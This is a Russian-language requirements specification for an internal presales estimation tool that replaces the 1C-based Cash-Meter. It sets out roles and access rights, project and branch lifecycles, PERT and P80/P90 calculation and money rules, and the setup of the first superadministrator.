## Как читать документ

- Требования пронумерованы: `FR-…` — функциональные, `NFR-…` — нефункциональные, `SEC-…` — информационная безопасность, `BR-…` — бизнес-правила. На номера ссылаются тест-кейсы и задачи в трекере, поэтому номера не переиспользуются: удалённое требование помечается «исключено», а не стирается.
- Слова **ДОЛЖНО**, **НЕ ДОЛЖНО**, **СЛЕДУЕТ**, **МОЖЕТ** используются в строгом смысле: «ДОЛЖНО» — обязательное требование MVP, «СЛЕДУЕТ» — желательно в MVP, допустимо перенести с согласия владельца продукта, «МОЖЕТ» — опционально.
- Блоки **«Почему так»** объясняют причину решения. Если разработчику кажется, что можно сделать проще, сначала стоит прочитать этот блок: чаще всего за решением стоит конкретная проблема Cash-Meter или требование безопасности.
- В версии 0.3 открытых допущений нет. Пометка **[Решение Q-NN]** означает, что пункт подтверждён заказчиком при разборе вопроса Q-NN (раздел 19).
- Схемы даны в Mermaid (рендерятся в GitLab, GitHub, Confluence с плагином, в опубликованной HTML-версии документа), макеты экранов — картинки с нумерованными выносками и таблицей расшифровки под каждой (раздел 11).

## 1. Введение

### 1.1. Контекст и проблема

Направление пресейла оценивает проекты создания информационных систем для внешних заказчиков. Сейчас процесс выглядит так: заказчик присылает запрос, специалист пресейла общается с заказчиком, затем модератор собирает экспертов разных дисциплин (бэкенд, фронтенд, аналитика, тестирование, архитектура, DevOps и т. д.), каждый эксперт оценивает свою часть в часах, модератор сводит всё в общую оценку и передаёт её пресейлу, а пресейл — заказчику.

Главная боль — сама оценка на уровне модератора и экспертов. В текущем инструменте Cash-Meter (на 1С):

| Проблема Cash-Meter | Последствие | Как решает новое приложение |
|---|---|---|
| Блокировка строки целиком при редактировании | Эксперты ждут друг друга, работают «по очереди» | Занята только одна ячейка, остальное правится параллельно (FR-TREE-31) |
| Эксперты сами придумывают этапы и фазы | Оценки разных проектов не складываются и не сравниваются | Фазы — справочник компании (раздел 5) |
| Роль проставляется в каждой строке и её забывают | Неверное распределение часов по ставкам | Дисциплина — уровень дерева, роль строки определяется автоматически |
| Правки модератора не видны экспертам | Эксперт не знает, что его цифру изменили | Каждая правка — событие в ленте листа и счётчик у эксперта (FR-TREE-34) |
| Неудобный интерфейс, много ручных «Сохранить» | Ошибки, потерянные изменения | Сохранение на лету, один рабочий экран (раздел 11) |
| База прошлых проектов не используется для калибровки | Каждый раз оценка «с нуля» | Типы узлов, нормы, копирование веток из прошлых проектов |

### 1.2. Цель приложения

Дать модератору и экспертам один инструмент, в котором они **одновременно и независимо** оценивают проект в виде дерева, видят итог и разброс в реальном времени, задают друг другу и заказчику вопросы прямо у строки оценки, а модератор и пресейл получают готовые цифры, допущения и документы для коммерческого предложения (КП).

### 1.3. Измеримые цели (для приёмки пилота)

[Решение Q-51] Метрика «−30% времени оценки к Cash-Meter» исключена: базовой линии в Cash-Meter нет, а параллельная оценка в двух системах отпугнёт экспертов. Пилот оценивается по опросу и метрикам ниже. Медиана «создание проекта → первый снимок» всё равно собирается в статистике как справочная.

| Цель | Метрика | Целевое значение |
|---|---|---|
| Удовлетворённость пользователей | Опрос модераторов и экспертов после пилота (шкала 1–5): «новый инструмент удобнее Cash-Meter» | Средняя оценка ≥ 4 по 10 пилотным проектам |
| Убрать ожидание блокировок | Число жалоб «не могу редактировать, занято» | 0 |
| Сделать правки прозрачными | Доля правок модератора, которые эксперт увидел (открыл событие) | ≥ 90% |
| Простота для экспертов | Время первого входа эксперта до первого заполненного листа без обучения | ≤ 10 минут |

### 1.4. Границы MVP

**Входит в MVP:**

- аутентификация через приложение или через Active Directory (выбирает суперадминистратор);
- админка суперадминистратора (первичная настройка, безопасность, администраторы) и админка администратора (справочники);
- проекты, команда проекта, ставки и валюта;
- рабочий экран с деревом оценки, расчётами на лету, совместной работой;
- комментарии к листьям, обсуждения под узлами, вопросы заказчику;
- статистика, снимки и сравнение со снимком;
- экспорт в Excel (оценка) и Excel/Word (вопросы заказчику);
- уведомления в приложении, письма о вопросах и ответах (пачкой за 15 минут) и ежедневная сводка на почту;
- документы заказчика, загруженные в проект (раздел 8.6);
- журнал аудита с передачей в SIEM по syslog.

**Не входит в MVP (кандидаты на следующие этапы):**

- расчёт календарного срока по составу команды и критическому пути (в MVP модератор вводит срок в неделях вручную, [Решение Q-02]);
- генерация полного документа КП (в MVP — выгрузка данных для КП);
- автоматический подбор норм по истории проектов (в MVP нормы задаёт администратор вручную, история копится);
- интеграции с CRM, Jira, 1С;
- перенос данных из Cash-Meter — не планируется: старые оценки остаются в 1С ([Решение Q-08]);
- вход через Kerberos/SSO без ввода пароля ([Решение Q-05]: архитектура аутентификации ДОЛЖНА позволять добавить его без переделки, см. ARCH-02);
- мобильная версия (экран рассчитан на ширину от 1366 px).

### 1.5. Чего приложение сознательно НЕ делает

- Не планирует проект после продажи (это задача трекера задач).
- Не является системой документооборота: документы заказчика можно загрузить в проект (раздел 8.6), но версий, согласований и вложений в обсуждениях нет — там только ссылки ([Решение Q-09]).
- Не показывает деньги экспертам ни в каком виде (BR-MONEY-01).
- Не доступно из интернета: только офисная сеть и корпоративный VPN ([Решение Q-35], NFR-ENV-01).

## 2. Термины и сокращения

| Термин | Определение |
|---|---|
| Проект (оценка) | Одна оценка одного запроса заказчика. В интерфейсе называется «проект». Содержит дерево, команду, настройки, обсуждения, снимки |
| Дерево оценки | Иерархия узлов: Проект → Фаза → Дисциплина → узлы декомпозиции → листья |
| Фаза | Этап жизненного цикла работ из справочника компании: «Анализ и проектирование», «Разработка», «Тестирование», «Внедрение», «Гарантийная поддержка», «Управление проектом» |
| Дисциплина | Профессиональное направление: Бэкенд, Фронтенд, Аналитика, QA, Архитектура, DevOps и др. Ведётся администратором |
| Ветка дисциплины | Узел «Дисциплина» внутри конкретной фазы со всем поддеревом. Зона ответственности экспертов этой дисциплины |
| Узел | Любой элемент дерева ниже ветки дисциплины, у которого есть дети |
| Лист | Узел без детей. Только листья содержат оценку O/R/P и множитель |
| Тип узла | Значение из словаря: Модуль, Функция, Экран, Интеграция, Отчёт, Сущность, Сервис, Тест-набор, Документ, Работа (+ свои типы компании) |
| Профиль дисциплины | Рекомендованная цепочка типов (например, «Модуль → Функция»), подсказка при добавлении узлов |
| Уровень детализации | Ожидаемая глубина дерева проекта: Крупно / Средне / Детально. Подсказка, не запрет |
| O / R / P | Оптимистичная, реалистичная, пессимистичная оценка трудозатрат в часах на одну штуку |
| Множитель (×N) | Сколько раз повторяется работа листа. Целое число ≥ 1, по умолчанию 1 |
| E | Ожидаемое значение по PERT: (O + 4R + P) / 6 |
| σ | Стандартное отклонение по PERT: (P − O) / 6 |
| P80 | Оценка, которая с вероятностью 80% не будет превышена: E + 0,8416·σ |
| УП | Фаза «Управление проектом», считается процентом от фаз, отмеченных модератором как база УП (по умолчанию все, кроме «Гарантийной поддержки») |
| Комментарий листа | Текст, описывающий сам лист: ограничения, технологии, риски, допущения. Может иметь метку |
| Метка комментария | «Огр.», «Тех.», «Риск», «Допущение» (справочник администратора) |
| Обсуждение | Лента сообщений под узлом. Для вопросов и переписки |
| Открытый вопрос | Сообщение с флагом «нужен ответ», ещё не закрытое |
| Снимок | Именованная неизменяемая копия оценки на момент времени (например, «v1 — КП отправлено») |
| Цифра для КП | Какое значение часов идёт в деньги и экспорт для КП: E, P80 или P90; выбирает модератор в настройках проекта, по умолчанию P80 |
| P90 | Оценка, которая с вероятностью 90% не будет превышена: E + 1,2816·σ |
| Закрытая заметка | Сообщение в обсуждении, которое видят только модераторы, пресейл проекта и руководитель пресейла (не эксперты) |
| Режим поддержки | Просмотр проекта администратором из реестра: только чтение, без денег, с указанием причины и записью в аудит |
| Самопроверка | Отметка «Проверено», которую ревьюер поставил на лист, последнюю оценку которого внёс сам |
| Ревьюер | Эксперт дисциплины, которому модератор дал право ставить отметку «Проверено» |
| КП | Коммерческое предложение заказчику |
| AD | Microsoft Active Directory, каталог учётных записей компании |
| LDAPS | LDAP поверх TLS (порт 636) |
| TOTP | Одноразовый пароль по времени (RFC 6238), второй фактор аутентификации |
| RBAC | Управление доступом на основе ролей |
| ПДн | Персональные данные (152-ФЗ) |
| SIEM | Система сбора и анализа событий безопасности службы ИБ |
| UAT | Приёмочное тестирование пользователями |

## 3. Роли и права доступа

### 3.1. Два уровня ролей

В приложении роли бывают **системные** (выдаются пользователю на всё приложение) и **проектные** (выдаются в конкретном проекте). Это ключевое различие, его нужно соблюдать и в модели данных, и в проверках прав.

```mermaid
flowchart LR
    subgraph SYS["Системные роли (на всё приложение)"]
        SA["Суперадминистратор"]
        AD["Администратор"]
        MOD_S["Модератор (право создавать проекты)"]
        PS_S["Пресейл"]
        HEAD["Руководитель пресейла"]
        AUD["Аудитор ИБ"]
        USR["Пользователь (по умолчанию)"]
    end
    subgraph PRJ["Проектные роли (внутри проекта)"]
        MOD_P["Модератор проекта"]
        EXP["Эксперт дисциплины"]
        REV["Ревьюер дисциплины (признак эксперта)"]
        PS_P["Пресейл проекта"]
    end
    MOD_S -- "создаёт проект и становится" --> MOD_P
    MOD_P -- "назначает" --> EXP
    MOD_P -- "отмечает" --> REV
    MOD_P -- "назначает" --> PS_P
    USR -. "может быть назначен" .-> EXP
    PS_S -. "может быть назначен" .-> PS_P
    HEAD -. "может войти модератором в любой проект" .-> MOD_P
```

### 3.2. Описание ролей

#### Суперадминистратор

Технический владелец приложения. Отвечает за **первичную настройку** и **безопасность**, а не за содержание оценок.

- Создаётся при установке приложения консольной командой (см. FR-SA-01). Через интерфейс суперадминистратора создаёт только другой суперадминистратор. Суперадминистраторов ДОЛЖНО быть от 2 до 3 ([Решение Q-07], BR-ROLE-03).
- Выбирает и настраивает способ аутентификации: через приложение (локальные учётные записи) или через AD.
- Создаёт, блокирует и разжалует администраторов; выдаёт роль «Аудитор ИБ». Роль «Администратор» выдаётся только вручную, через группы AD — никогда ([Решение Q-17]).
- Сбрасывает пароль и TOTP другому суперадминистратору ([Решение Q-22]).
- Пользователей с обычными ролями не создаёт: это задача администратора.
- Настраивает политики безопасности: пароли, блокировки, сессии, второй фактор, разрешённые сети для админки.
- Настраивает почтовый сервер (SMTP), адрес приложения, хранение журналов.
- Просматривает и выгружает журнал аудита.
- Не управляет серверами, БД и бэкапами: это зона службы эксплуатации ИТ, и суперадминистратор приложения — другой человек ([Решение Q-28]).
- **Не видит** содержимое проектов, ставки и деньги. Видит только служебный реестр проектов (название, модератор, статус, даты) — без дерева и обсуждений.

> **Почему так.** Разделение обязанностей (separation of duties): тот, кто управляет доступом, не должен автоматически иметь доступ к коммерческим данным. Если учётная запись суперадминистратора будет скомпрометирована, злоумышленник не получит ставки и оценки напрямую.
>
> **Остаточный риск.** Суперадминистратор настраивает SMTP и режим входа. Теоретически он может направить почту на свой сервер и перехватить ссылки установки пароля, а через них войти под модератором. Двойного контроля для этого нет ([Решение Q-26]); риск закрывается обнаружением: смена SMTP, режима входа, создание администраторов и суперадминистраторов немедленно оповещают всех администраторов и ИБ по **старому** каналу (SEC-AUTH-07), а журнал аудита независимо читает аудитор ИБ и получает SIEM.

#### Администратор

Методолог приложения. Ведёт справочники, по которым работают все проекты.

- Справочник фаз, список дисциплин, словарь типов узлов и нормы, профили дисциплин.
- Пороги детализации, процент УП по умолчанию, контрольные соотношения дисциплин, метки комментариев.
- Управляет пользователями: выдаёт системные роли «Модератор», «Пресейл» и «Руководитель пресейла», блокирует пользователей. В режиме «приложение» создаёт их; в режиме AD находит в каталоге AD и заводит заранее или пользователь появляется при первом входе (FR-AUTH-AD-06, FR-AUTH-AD-10).
- Заменяет участника во всех активных проектах сразу при увольнении или долгом отсутствии (FR-ADM-05, [Решение Q-29]).
- Принимает или отклоняет локальные типы узлов, созданные экспертами.
- Передаёт проект другому модератору (когда модератор уволился или ушёл в отпуск) и видит список «Проекты без модератора» (BR-PRJ-07).
- **Не видит** ставки и деньги по должности. Содержимое проекта видит в **режиме поддержки** — только чтение, без денег, с указанием причины, с записью в аудит и уведомлением модераторам ([Решение Q-15], FR-ADM-06).
- Может назначить в проект себя (если у него есть роль «Модератор») или созданную им учётку; тогда видит деньги как участник проекта. Это **принятый риск**: администратор — доверенное лицо ([Решение Q-25]). Каждое такое назначение пишется в аудит с пометкой «администратор назначил себя / свою учётку» и видно аудитору ИБ.
- Роль совместима с ролью модератора: один человек может быть и администратором, и модератором.

#### Модератор (системная роль) и модератор проекта

- Системная роль «Модератор» даёт право **создавать проекты**. Создатель автоматически становится модератором проекта.
- В проекте может быть **несколько модераторов** (как в Cash-Meter). Права у них одинаковые.
- Модератор проекта владеет всей оценкой: настройки проекта, команда, ставки, валюта, НДС, процент УП и база УП, цифра для КП, срок в неделях, правка любого листа, снимки, экспорт с деньгами, закрытие любых обсуждений, закрытые заметки.

#### Эксперт

- Любой активный пользователь, которого модератор назначил в проект на одну или несколько дисциплин.
- Правит структуру и оценки **только в ветках своих дисциплин** (во всех фазах), видит всё дерево проекта.
- Пишет комментарии к листам своих веток, участвует в любых обсуждениях проекта.
- Не видит ставки, стоимость и валюту нигде: ни на экране, ни в статистике, ни в выгрузке, ни в ответах API.

#### Ревьюер

- Не отдельная роль, а признак эксперта в дисциплине проекта. Ставит отметку «Проверено» на лист или ветку своей дисциплины.
- Может поставить «Проверено» и на листья, которые оценивал сам, но такая отметка показывается как «самопроверка» (значок ◐ вместо ✓) и отдельно считается в статистике ([Решение Q-33], FR-REV-04).

#### Пресейл (системная роль) и пресейл проекта

- Общается с заказчиком. С оценкой не работает: дерево только читает.
- Видит деньги (итог в валюте КП, стоимость в статистике, экспорт с деньгами).
- Ведёт список вопросов заказчику: выгружает, меняет статусы, вносит ответы.
- Видит ставки по дисциплинам, курс и стоимость по дисциплинам ([Решение Q-32]): нужно для торга с заказчиком.
- Заполняет «Результат пресейла» (BR-PRJ-05), пишет закрытые заметки.
- Системная роль «Пресейл» нужна, чтобы пользователя можно было выбрать в поле «Пресейл» настроек проекта.

#### Руководитель пресейла (системная роль) — [Решение Q-31]

- Видит реестр всех проектов **с деньгами** и сводку по портфелю (раздел 10.4).
- Открывает любой проект на чтение со всеми деньгами, не будучи участником.
- Может войти в любой проект модератором кнопкой «Стать модератором проекта»: он добавляется в команду модератором, действующие модераторы получают уведомление, действие пишется в аудит.
- Не правит справочники и пользователей.

#### Аудитор ИБ (системная роль) — [Решение Q-27]

- Только читает и выгружает **весь** журнал аудита, включая действия суперадминистраторов.
- Не видит проекты, деньги, пользователей (кроме имён в журнале) и настройки.
- Роль выдаёт и снимает суперадминистратор; снятие роли оповещает ИБ (SEC-AUTH-07).
- Совместима только с ролью «Пользователь»: аудитор не может быть администратором или суперадминистратором.

> **Почему так.** Суперадминистратор не должен быть единственным, кто читает журнал своих же действий. Аудитор — независимый взгляд внутри приложения, SIEM — вне его.

Матрица описывает права в статусе «Оценка». Как права меняются в других статусах проекта, показано в таблице 3.4.

**BR-ROLE-01.** Пользователь может одновременно иметь несколько системных ролей (например, Администратор + Модератор). Права суммируются, **кроме** запретов на деньги: администратор, назначенный в проект модератором, видит деньги именно как модератор этого проекта, а в режиме поддержки денег не видит. Если у пользователя несколько ролей с разными тайм-аутами бездействия, действует самый короткий (FR-SESS-02).

**BR-ROLE-02.** Суперадминистратор не может одновременно иметь любые другие роли и не может быть назначен в проект. Аудитор ИБ совместим только с ролью «Пользователь». Если человеку нужно работать с оценками, у него должна быть отдельная обычная учётная запись.

> **Почему так.** Учётная запись суперадминистратора — самая ценная цель атаки. Чем меньше она используется в повседневной работе, тем меньше шанс, что её пароль или сессию украдут (фишинг, заражённый ноутбук, оставленный открытым браузер).

**BR-ROLE-03.** В приложении ДОЛЖНО быть от 2 до 3 активных суперадминистраторов ([Решение Q-07]). Заблокировать или разжаловать последнего суперадминистратора нельзя (кнопка неактивна, API возвращает 409). Пока активен только один, в админке суперадминистратора висит красный баннер «Заведите второго суперадминистратора: без него потерянный пароль восстанавливается только через ИТ». Создать четвёртого нельзя (409).

**BR-ROLE-04.** Если пользователь в проекте одновременно модератор и эксперт, итоговые права — модератора (как в Cash-Meter), а в команде он показывается в обоих списках.

**BR-ROLE-05.** Эксперт может быть назначен на несколько дисциплин одного проекта (например, «Бэкенд» и «DevOps»).

**BR-ROLE-06.** Если пользователя исключили из проекта, его листья, комментарии и сообщения остаются с указанием автора. Он теряет доступ к проекту сразу, в том числе к архивной копии и к копированию веток из него; открытые вкладки получают событие отзыва прав и показывают сообщение «Доступ к проекту отозван».

**BR-ROLE-07.** Последнего модератора проекта удалить из команды нельзя (кнопка неактивна, API 409 `LAST_MODERATOR`) ([Решение Q-30]).

**BR-ROLE-08.** Если у пользователя-модератора снимают системную роль «Модератор», он остаётся модератором в уже существующих проектах, но не может создавать новые.

## 4. Бизнес-процесс и жизненные циклы

### 4.1. Сквозной процесс оценки

```mermaid
sequenceDiagram
    autonumber
    actor C as Заказчик
    actor PS as Пресейл
    actor M as Модератор
    actor E as Эксперты
    participant APP as Приложение
    C->>PS: Запрос на оценку, ТЗ
    PS->>M: Передаёт запрос (вне приложения: почта, CRM)
    M->>APP: Создаёт проект, включает фазы, уровень детализации, дедлайн
    M->>APP: Назначает экспертов по дисциплинам, ревьюеров, пресейла
    APP-->>E: Уведомление «Вас назначили в проект»
    par Эксперты работают одновременно и независимо
        E->>APP: Строят ветки своих дисциплин, ставят O/R/P, ×N, комментарии
        E->>APP: Задают вопросы коллегам и заказчику в обсуждениях
    end
    APP-->>PS: Вопросы с адресатом @заказчик
    PS->>C: Выгруженный список вопросов
    C-->>PS: Ответы
    PS->>APP: Вносит ответы (статус «отвечен»)
    E->>APP: Корректируют оценку, отмечают ветки «готово»
    M->>APP: Следит за сеткой готовности, правит листья, ставит «Проверено»
    M->>APP: Делает снимок «v1 — КП отправлено», выгружает Excel с деньгами
    M->>PS: Передаёт оценку
    PS->>C: КП
    Note over M,APP: Дерево остаётся живым: после ответа заказчика<br/>оценку можно доработать и сделать снимок v2
```

### 4.2. Жизненный цикл проекта

```mermaid
stateDiagram-v2
    [*] --> Подготовка: Модератор создал проект
    Подготовка --> Оценка: Модератор нажал «Запустить оценку»
    Оценка --> Сведение: Все ветки «готово» или «не нужно»<br/>(или модератор вручную)
    Сведение --> Оценка: Модератор вернул в работу
    Сведение --> Завершена: Модератор нажал «Завершить»
    Завершена --> Оценка: Модератор переоткрыл
    Завершена --> Архив: Модератор / автоматически через N дней (180 по умолчанию)
    Оценка --> Архив: Модератор (проект отменён)
    Архив --> Завершена: Модератор восстановил
```

| Статус | Кто видит проект | Что можно делать | Уведомления |
|---|---|---|---|
| Подготовка | Только модераторы | Настройки, команда, структура фаз. Эксперты ещё не видят проект в «Моих оценках» | Не отправляются |
| Оценка | Вся команда | Всё по правам | Работают |
| Сведение | Вся команда | Эксперты могут править, но ветки «готово» при правке переходят в «черновик» с предупреждением; модератор правит и ставит «Проверено» | Работают |
| Завершена | Вся команда | Только чтение для всех; модератор может переоткрыть; пресейл и модератор продолжают вести вопросы заказчику и «Результат пресейла» | Только по вопросам заказчику |
| Архив | Вся команда (текущие участники), руководитель пресейла | Только чтение и копирование веток; проект скрыт из «Моих оценок» по умолчанию, ищется фильтром «Архив» ([Решение Q-44]) | Не отправляются |

Подробно права по статусам — таблица 3.4.

**BR-PRJ-01.** Переход «Оценка → Сведение» предлагается системой автоматически (баннер модератору «Все ветки готовы. Перейти к сведению?»), но выполняется только кнопкой модератора. **Почему:** модератор может ждать ответов заказчика, даже если эксперты всё отметили.

**BR-PRJ-02.** Снимки можно делать в статусах «Оценка», «Сведение», «Завершена». **Почему:** снимок «КП отправлено» часто делают до завершения, когда заказчик просит предварительную цифру.

**BR-PRJ-03.** Срок автоархивации — 180 дней после перехода в «Завершена»; срок настраивает администратор, значение 0 отключает автоархивацию ([Решение Q-13]). Автоархивация выполняется ночной задачей и пишется в ленту проекта от имени «Система».

**BR-PRJ-04.** Удалить проект физически нельзя никому через интерфейс. Модератор может пометить проект «отменён» (переход в Архив с причиной). Физическое удаление выполняет служба эксплуатации ИТ консольной командой по заявке, согласованной с ИБ, с записью в аудит (например, по требованию ИБ или при ошибочном создании). Удаляются проект, дерево, обсуждения, снимки, история изменений, документы заказчика; записи аудита остаются (в них нет содержимого оценки). **BR-PRJ-05.** У проекта есть необязательный блок «Результат пресейла» ([Решение Q-14]):

### 4.3. Жизненный цикл ветки дисциплины

```mermaid
stateDiagram-v2
    [*] --> НеНачато: Модератор добавил дисциплину в проект
    НеНачато --> Черновик: Первая правка в ветке (автоматически)

    НеНачато --> НеНужно: Модератор
```

**BR-BR-01.** «Готово» ставится, только если в ветке нет листьев с пустой оценкой и с нарушением O ≤ R ≤ P. Открытые вопросы **не блокируют** «готово», но статус показывается как «Готово · 2 открытых вопроса».

**BR-BR-02.** Правка **комментария** листа не сбрасывает «готово». Правка O/R/P, ×N, добавление, удаление, перенос узла — сбрасывают. **Почему:** комментарий не меняет цифру, а цифра, ушедшая после «готово», должна снова пройти внимание эксперта и модератора. Полный перечень действий:

| Действие | Статус ветки | «Проверено» на узле / листе | Событие в ленте |
|---|---|---|---|
| Правка O/R/P, ×N | «готово» → «черновик» | снимается с листа и всех предков | да |
| Добавление, удаление, восстановление из корзины, разбиение, сворачивание | «готово» → «черновик» | снимается с родителя и всех предков | да |
| Переименование узла, смена типа | не меняется | не снимается | да |
| Правка комментария и метки | не меняется | не снимается | да |
| Перенос модератором между ветками | обе ветки: «готово» → «черновик» | снимается с перенесённого узла, его детей и предков в обеих ветках | да, в обеих ветках |

В каждом случае, где статус ушёл из «готово», модератор получает уведомление «Ветка вернулась в черновик» (FR-NOTIF-01).

**BR-BR-03.** Статус ветки «Дисциплина» в фазе определяется ровно один на пару «фаза × дисциплина». Отдельных статусов у узлов ниже нет.

## 6. Расчётная модель

Этот раздел — единственный источник истины для формул. Сервер и клиент считают по одним и тем же формулам; клиент — для мгновенного отображения, сервер — для экспорта, снимков и проверки. Расхождение клиента и сервера в тестах — дефект.

### 6.1. Формулы листа

Для листа с оценкой O, R, P (часы на одну штуку) и множителем N:

```text
E_ед   = (O + 4·R + P) / 6          ожидаемое значение одной штуки (PERT)
σ_ед   = (P − O) / 6                стандартное отклонение одной штуки
E_лист = N · E_ед
σ_лист = N · σ_ед                   ← умножается на N, а не на √N
```

> **Почему σ умножается на N, а не на √N.** Двенадцать одинаковых экранов делает одна команда по одной норме. Если норма ошибочна, она ошибочна для всех двенадцати сразу (полная корреляция). Формула √N предполагала бы, что ошибки по экранам независимы и взаимно гасятся, и дала бы ложную уверенность. Пример: 12 экранов по 4–6–8: σ = 12 · 0,667 = 8 ч, а не √12 · 0,667 = 2,3 ч.

### 6.2. Свёртка вверх по дереву

```text
E_узла = Σ E_детей
σ_узла = √( Σ σ_детей² )            листья разных строк считаются независимыми
O_узла = Σ N·O, R_узла = Σ N·R, P_узла = Σ N·P   (только для подсказки, не для P80)
P80    = E + 0,8416 · σ             z-квантиль нормального распределения для 80%
P90    = E + 1,2816 · σ             z-квантиль для 90% (нужен для «Цифры для КП» = P90, Q-01)
```

> **Почему P80 считается через σ, а не как сумма P.** Сумма пессимистичных оценок всех листьев — ситуация, когда всё пошло плохо одновременно; её вероятность ничтожна, и цифра получается завышенной в разы. Сумма σ в квадратах — стандартный способ сложить независимые неопределённости. Значения квантилей (0,8416 и 1,2816) — константы в коде. Какая из цифр (E, P80 или P90) идёт в КП, решает настройка проекта «Цифра для КП» (раздел 6.4).

### 6.3. Управление проектом

```text
E_работ  = Σ E всех включённых фаз, кроме УП
σ_работ  = √( Σ σ² всех листьев, кроме УП )
E_базы   = Σ E фаз, отмеченных как «база УП»     по умолчанию все, кроме «Гарантийная поддержка»
σ_базы   = √( Σ σ² листьев фаз базы УП )
E_УП     = k · E_базы                k — процент УП проекта (по умолчанию 18%; «выключено» = 0%)
σ_УП     = k · σ_базы
E_итог   = E_работ + E_УП
σ_итог   = σ_работ + σ_УП            ← УП полностью коррелирует со своей базой
P80_итог = E_итог + 0,8416 · σ_итог
P90_итог = E_итог + 1,2816 · σ_итог
```

**BR-CALC-05.** В настройках проекта модератор отмечает флажками фазы, которые образуют базу УП (Q-42). По умолчанию отмечены все фазы, кроме «Гарантийная поддержка». Если отмечены все фазы, формулы выше совпадают с прежними: E_итог = (1 + k) · E_работ. Если в базе нет ни одной фазы с часами, E_УП = 0.

**BR-CALC-01.** Ветки со статусом «не нужно» в расчётах не участвуют (они пустые по определению).

**BR-CALC-02.** Листья с пустой или неверной оценкой (O > R или R > P) **не входят** в суммы и подсвечиваются. В верхней полосе показывается предупреждение «3 листа без оценки не учтены». **Почему:** включение недооценённых листьев с нулём выглядит как «готовая» цифра и вводит в заблуждение; явное «не учтено» честнее.

**BR-CALC-03.** Хранение: O/R/P — `NUMERIC(10,2)` (шаг ввода 0,5 ч, минимум 0, максимум 99 999,5; ввод с другим шагом округляется до 0,5 ч по ROUND_HALF_UP с подсказкой у поля), ×N — целое 1–10 000 (NFR-LIM-01), ставки — `NUMERIC(12,0)` (целые ₽/ч), курс — `NUMERIC(12,4)`, проценты — `NUMERIC(5,2)`. Промежуточные расчёты — без округления, в десятичной арифметике: на сервере Python `Decimal`, на клиенте — библиотека десятичной арифметики (decimal.js), а не числа с плавающей точкой. Округление выполняется только при выводе и только по правилу ROUND_HALF_UP (0,05 → 0,1; 3,45 → 3,5). Отображение: часы — 1 знак после запятой; деньги — до целого рубля (до целых единиц в валюте КП), см. BR-MONEY-04; проценты — целые. Если E проекта = 0, отношения P80/E и P90/E не вычисляются, денежные P80/P90 равны 0, а доли дисциплин показываются как «—».

**BR-CALC-04.** O = R = P допустимо (σ = 0). O = 0 допустимо. Все три нуля допустимы и означают «работа есть, но трудозатрат не требует» (например, переиспользуем готовый модуль); такой лист выделяется серым.

### 6.4. Деньги

**BR-MONEY-01.** Деньги (ставки, курс, стоимости, итог в рублях и валюте, НДС) видят только роли с доступом к деньгам: модератор и пресейл проекта, а также руководитель пресейла во всех проектах (матрица 3.3). Суперадминистратор и администратор по должности денег не видят; администратор видит их, только если назначен участником проекта (BR-ROLE-01, [Решение Q-25]). Эксперты, ревьюеры и аудитор ИБ денег не видят ни в интерфейсе, ни в API, ни в экспорте; сервер не отдаёт им денежные поля, а не просто скрывает их.

```text
Стоимость_дисциплины (₽) = округл(E_дисциплины · ставка_дисциплины)      округл = до 1 ₽, ROUND_HALF_UP
Стоимость_УП (₽)         = округл(E_УП · ставка «Управление проектом»)
Итог без НДС (₽)         = Σ Стоимость_дисциплин + Стоимость_УП            сумма уже округлённых строк
НДС (₽)                  = округл(Итог без НДС · ставка_НДС)               строки нет, если «без НДС»
Итог с НДС (₽)           = Итог без НДС + НДС
Итог (валюта КП)         = округл(Итог (₽) / курс)                         курс = ₽ за 1 единицу валюты
P80_итог (₽)             = округл(Итог без НДС · P80_итог / E_итог)
P90_итог (₽)             = округл(Итог без НДС · P90_итог / E_итог)
```

> **Почему P80 в деньгах считается пропорцией.** У дисциплин разные ставки, а P80 не аддитивен: сумма P80 дисциплин больше P80 проекта. Пропорция «P80 / E» применяется к итоговой стоимости и даёт согласованную пару «E ₽ / P80 ₽». Это упрощение, о нём написано в подсказке у цифры. P90 считается так же.

**BR-MONEY-04.** Округление денег (Q-40): каждая строка округляется до целого рубля (в валюте КП — до целых единиц) по ROUND_HALF_UP, а итог равен сумме уже округлённых строк. Поэтому в экспорте сумма столбца всегда сходится с итогом до рубля.

**BR-MONEY-05.** Цены в приложении — без НДС (Q-41). Ставка НДС — настройка проекта: «без НДС», 0%, 5%, 7%, 10%, 20% (список — справочник администратора). Под итогом выводятся строки «НДС N%» и «Итого с НДС»; при «без НДС» выводится надпись «НДС не облагается».

**BR-MONEY-06.** «Цифра для КП» (Q-01) — настройка проекта: E, P80 или P90, по умолчанию P80. Она определяет, какая цифра часов и денег выделена в верхней полосе как «в КП» и какая идёт в экспорт «для КП». Остальные цифры остаются видны модератору и пресейлу для сравнения.

Срок проекта приложение не рассчитывает: в КП идёт ручное поле «Срок, недель» (BR-PRJ-06, [Решение Q-02]).

**BR-MONEY-02.** Ставки задаются в рублях за час на проект по каждой дисциплине, которая есть в проекте, плюс ставка УП. Если не задана ставка дисциплины, у которой в проекте есть часы (E > 0), или ставка УП при E_УП > 0, у ролей с доступом к деньгам вместо суммы показывается «не заданы ставки: QA, УП». Пустая ставка дисциплины без часов на итог не влияет.

**BR-MONEY-03.** Валюта КП: RUB, USD, EUR, CNY, KZT, BYN, AED (список — справочник администратора). Курс вводится вручную модератором (₽ за 1 единицу, 4 знака после запятой) и фиксируется в проекте. Для RUB курс = 1 и поле скрыто. Автозагрузки курса ЦБ в MVP нет. **Почему:** цифра в КП должна воспроизводиться через месяц; плавающий курс это ломает.

### 6.6. Доли дисциплин и контрольные соотношения

Доли показываются только в статистике (при E = 0 — «—», BR-CALC-03). Контрольное соотношение задаёт администратор как «дисциплина A к сумме дисциплин B, допустимый диапазон». Пример по умолчанию: «QA к (Бэкенд + Фронтенд) — 25–35%». В примере: 45,8 / (92,7 + 97,3) = 24,1% → предупреждение «ниже нормы». Соотношения предупреждают, но ничего не блокируют.

### 7.1. Первичная установка и суперадминистратор

**FR-SA-01.** Первый суперадминистратор создаётся только консольной командой `estimator create-superadmin --login <login> --email <email>` внутри контейнера приложения. Команда не принимает пароль аргументом (чтобы он не попал в историю shell), а выводит одноразовую ссылку активации со сроком действия 60 минут. Адрес в ссылке берётся из переменной окружения `APP_BASE_URL` (до прохождения мастера адреса в БД ещё нет). Если ссылка истекла или потеряна, команду `estimator issue-activation --login <login>` можно выполнить повторно: прежняя ссылка аннулируется. Каждый запуск консольной команды пишется в аудит (SEC-AUD-01). **Почему:** нет «пароля по умолчанию» (admin/admin) — одной из самых частых уязвимостей корпоративных приложений.

